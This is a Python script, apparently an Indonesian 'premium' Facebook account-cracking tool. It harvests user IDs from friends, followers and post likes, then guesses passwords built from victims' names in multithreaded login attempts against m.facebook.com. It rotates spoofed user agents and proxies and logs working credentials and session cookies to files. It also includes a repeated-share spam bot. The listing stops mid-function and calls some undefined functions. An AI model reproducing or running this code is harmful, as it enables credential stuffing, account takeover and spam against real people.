#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen=[]
cokbrut=[]
header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')   

    aa='Mozilla/5.0 (Linux; Android 10'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='en-us; GM1910 Build/QKQ1.190716.003/)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H' 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 OnePlusBrowser/30.5.0.9'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #EMAS +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#++++++++++++++[ MENAMBAH OPSI XHURAI ]++++++++++++
negara = requests.get("http://ip-api.com/json/").json()["country"]
datt = []
sc = "premium_fb"
rn___ = "ridwan"
team___ = "xtc_code"
sim = requests.get("http://ip-api.com/json/").json()["isp"]
#------------------[ MACHINE-SUPPORT ]---------------#
def ridwan_xd1928(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	clear()
	cetak(nel(f'SELAMAT DATANG PENGUNA TOLLS RIDWAN-XD'))
	sol()
	ban='''SELAMAT DATANG BAGI PENGUNA SCRIPT PREMIUM 
SCRIPT ATAU SC ADALAH ALAT PEMBOBOL AKUN FACEBOOK DAN JUGA INSTAGARAM YANG BERBENTUK BASIC DENGAN PEMBAWA ALAT LINUX DAN JUGA DEBIAN/UBUNTU ALAI INI BISA DI INSTAL DI BERBAGAI LINUX LINUX ATAU PUN TERMINAL BAGI YANG SUDAH MEMAKAI SCRIPT INI HARAP GUNAKAN DENGAN BAIK KARNA SAYA SEBAGAI ADMIN TIDAK AKAN BERTANGGUNG JAWAB KALO ADA YANG TERJADI APA APA SCRIPT JUGA MELUPAKAN SCRIPT PREMIUM JIKA ADA YANG MENJUAL NYA TOLONG HUBINGU KONTAK SAYA : 083862287464 DAN LAPOR KAN APA YANG ANDA KETAHUI SCRIPT UPDATE PADA minngu-2-okteber SCRIPT TIDAK AKAN BERTAHAN LAMA JIKA HASIL TIDAK PUAS SILAKAN DI GANTI USER-AGENT DAN SAYA JUGA TIDAK YAKIN SCRIPT INI AKAN MENDAPETKAN HASIL PUAS KARNA DI SEBAB KAN FACEBOOK SEDANG UPDATE KEMUNGKINAN RASIO CP AKAN BERUBAH MENJADI 67% DAN RASIO OK AKAN BERUBAH MENJADI 33% TERIMA KASIH'''
	cetak(nel(ban, style='green'))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()		
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		os.system('rm -rf .proxy.txt')
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()	
	
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:ipbusuk = cek_data["isp"]
	except:ipbusuk = {'-'}
	try:asal_kota = cek_data["city"]
	except:asal_kota = {'-'}
	print(f'==========[ {H}INFOMASI PENGUNA ONNLINE {P}]==========\n{P}({H}+{P}) NAMA : {my_name}\nID : {my_id}\n{P}({H}+{P}) NEGARA : {negara}\nSIM : {sim}\n{P}({H}+{P}) KOTA : {asal_kota}')
	print(f'==========[{H} INFOMASI AUTHOR {P}]==========\n{P}({H}1{P}) AUTHOR : {rn___}\n{P}({H}2{P}) TEAM : {team___}\n{P}({H}3{P}) STATUS SC : {sc}')
	print(f'______________________________')
	print(f'1. crack publik {P}({H}being famous{P}) type {P}{H}1/01{P})\n2. crack publik {P}({H}massal{P}) type {P}({H}2/02{P}\n3. crack dari pengikut {P}({M}not good{P}) type {P}({H}3/03{P})\n4. crack dari likes postingan {P}({M}not very good{P}) type {P}({H}4/04{P})\n5. cek hasil crack type {P}({H}5/05{P})\n6. cek opsi cp type {P}({H}6/06{P})\n7. share bot postingan facebook type {P}({H}7/07{P})\n0. exit type{P} ({M}0/00{P})')
	print(f'______________________________')
	___ridwan___xd___ridwan___xd = input(x+'['+p+'?'+x+'] select the menu that is already available : ')
	print('')
	if ___ridwan___xd___ridwan___xd in ['1']:
		publik()
	elif ___ridwan___xd___ridwan___xd in ['2']:
		massal()
	elif ___ridwan___xd___ridwan___xd in ['3']:
		crack_pengikut()
	elif ___ridwan___xd___ridwan___xd in ['4']:
		crack_like()
	elif ___ridwan___xd___ridwan___xd in ['6']:
		cek_cp()
	elif ___ridwan___xd___ridwan___xd in ['5']:
		results()
	elif ___ridwan___xd___ridwan___xd in ['7']:
		memez()
	elif ___ridwan___xd___ridwan___xd in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		os.system('rm -rf .proxy.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
def crack_pengikut():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID FROM FOLLOWERS'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# FAILED DUMP OR BROKEN TOKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
#DUMP LIKES
def crack_like():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID FROM LIKE POST'
	win2 = mark(win, style='green')
	sol().print(win2)
	pil = input(x+'['+p+'f'+x+'] INPUT ID POST : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=likes.limit(10000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['likes']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# POST IS NOT PUBLIC OR TOKEN BROKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f' how many target id do you want? : '))
	except ValueError:
		print('typo ')
		exit()
	if jum<1 or jum>100:
		print(' Failed  Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'want to bulk crack make sure id starts from {P}[{H}10000{P}]\nstart with target to'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> unstable signal ')
			exit()
	try:
		print('')
		print(f'successfully collected id {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	print(f'{x}1. crack from id old {P}({M}never{P}) type {P}({H}1/01{P})')
	print(f'2. crack from id new {P}({H}always green{P}) type {P}({H}1/01{P})')
	print(f'3. crack from random id {P}({H}very good {P}) type {P}({H}3/03{P})')
	print('')
	hu = input('select setting id : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')
		
	print('')
	print(f'1. go to the method {B}mobile.facebook.com{P} ketik ({H}1/01{P})')
	print('')
	hc = input('choose an available method : ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	print('')
	pwplus=input(f'add password manually? {P}({M}y/n{P} ){P}? :')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f'result {P}({H}OK{P} will be saved to data foder {H}{okc}')
	print(f'result {P}({K}CP{P} will be saved to data foder {K}{okc}')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'free' in method:
				pool.submit(crackfree,idf,pwv)
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print('want to continue cracking? ( Y/t ) ? ')
	woi = input('Select : ')
	if woi in ['y','Y']:
		dump_massal()
	else:
		print(f'\t{x}>>{k} Oke See You Bang {x} << ')		
		time.sleep(2)
		back()
#--------------------[ SHARE POSTINGAN ]-------------#		
def memez():
	try:  
		token = open('.token.txt', 'r').read()
		cok = open(".cok.txt","r").read()
		nama = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token), cookies={"cookie":cok}).json()["name"]		
	except (KeyError, IOError):
		print("\n [!] token kadaluwarsa!")
		login()
	except requests.exceptions.ConnectionError: 
		exit("[!] anda tidak terhubung ke internet!")
	idt = input(f" Enter the Facebook post link : {H} ")
	limit = int(input(f" {N}enter the Limit : {H} "))
	print(f"\n\t\t{H}ctrl+z {N}stops \n")	
	cok = open('.cok.txt', 'r').read()
	token = open('.token.txt', 'r').read()
	cookie = {"cookie":cok}
	try:
		for x in range(limit):
			x+=1
			response = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).json()
			if "id" in response:
				sys.stdout.write(f"\r [{H}*{N}] DONE {x} | {H}{response}");sys.stdout.flush()
			else:
				print(f" gagal,mungkin akun anda terkena spam");exit()
	except requests.exceptions.ConnectionError:
		exit("[!] anda tidak terhubung ke internet!")	
	cetak('\n\n[cyan]>>[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')	
	print('')
	print(f'{k} Succes : {x} ')
	print('>> Lanjut Share ( Y/t ) ? ')
	woi = input('>> Select : ')
	if woi in ['y','Y']:
		memek()
	else:
		print(f'\t{x}>>{k} Oke See You Bang {x} << ')		
		time.sleep(2)
		back()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : {P}({H}%s{P}) + CP : {P}({K}%s{P}) = %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ugen='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0'
	ua = random.choice(['mozilla/5.0 (iphone; cpu iphone os 10_1_1 like mac os x) applewebkit/602.2.14 (khtml, like gecko) mobile/14b100 [fban/fbios;fbav/177.0.0.62.98;fbbv/114599009;fbdv/iphone7,2;fbmd/iphone;fbsn/ios;fbsv/10.1.1;fbss/2;fbcr/telkomsel;fbid/phone;fblc/id_id;fbop/','Mozilla/5.0 (Linux; Android 10; RMX1971 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 hola_android','Mozilla/5.0 (Linux; U; Android 9; ru-ru; RMX1971 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 RealmeBrowser/30.5.0.8','Opera/9.80 (Windows NT 5.1; U; Edition Telkomsel; en) Presto/2.6.30 Version/10.62','Mozilla/5.0 (Linux; Android 4.4.4; XT1080 Build/SU6-7.7; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.117 Mobile Safari/537.36 Puffin/7.1.2.18064AP','Mozilla/5.0 (Linux; Android 12; V2036 Build/SP1A.210812.003; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.7.2.51367AP','Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; tr-tr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.7.2.51367AP','Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36','Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.92 Mobile/15E148 Safari/604.1','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; SM-N750K Build/LMY47X; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Puffin/6.0.8.15804AP','Mozilla/5.0 (X11; U; Linux x86_64; en-IE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/5.2.6IP','Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3'])
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=124578887583575&kid_directed_site=0&app_id=124578887583575&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D124578887583575%26cbt%3D1661161889857%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df86eb6919f1aec%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3286caca7e6248%2526relation%253Dopener%26client_id%3D124578887583575%26display%3Dtouch%26domain%3Dwww.mediafire.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.mediafire.com%252Flogin%252F%26locale%3Den_US%26logger_id%3Df36c5689f29cb6c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df357e7157f7ded4%2526domain%253Dwww.mediafire.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.mediafire.com%25252Ff3286caca7e6248%2526relation%253Dopener%2526frame%253Df11116867059048%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df357e7157f7ded4%26domain%3Dwww.mediafire.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.mediafire.com%252Ff3286caca7e6248%26relation%3Dopener%26frame%3Df11116867059048%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}Login CP {M}{K}{idf}|{pw}{N}\n {x}User Agent{x} : {x} {M}{ua}{M}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{b}Login ok {M}\n{P}[{H}prem-ok{P}] {H}{idf}|{pw}\n{P}[{H}prem-ok{P}] {kuki}\n{x}{P}[{M}prem-ok{P}]{x}User Agent{x} : {x} {M}{ua}{H}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ LOGIN FREE FB    ]--------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
